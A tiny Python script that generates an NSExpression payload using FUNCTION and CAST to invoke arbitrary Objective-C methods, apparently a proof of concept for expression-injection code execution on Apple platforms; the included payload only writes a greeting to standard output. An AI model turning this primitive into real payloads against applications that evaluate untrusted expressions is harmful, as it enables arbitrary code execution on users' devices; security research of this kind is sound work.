#!/usr/bin/env python3
import os
def createPrintLogToStdoutNSExpression():
    return "FUNCTION(FUNCTION(CAST('NSFileHandle','Class'), 'fileHandleWithStandardOutput'), 'writeData:', FUNCTION('!!!!! hello from function expression! !!!!!!\\n', 'dataUsingEncoding:', FUNCTION(2,'intValue')))"

print(f"FUNCTION(CAST('NSNull','Class'), 'alloc', {createPrintLogToStdoutNSExpression()})")

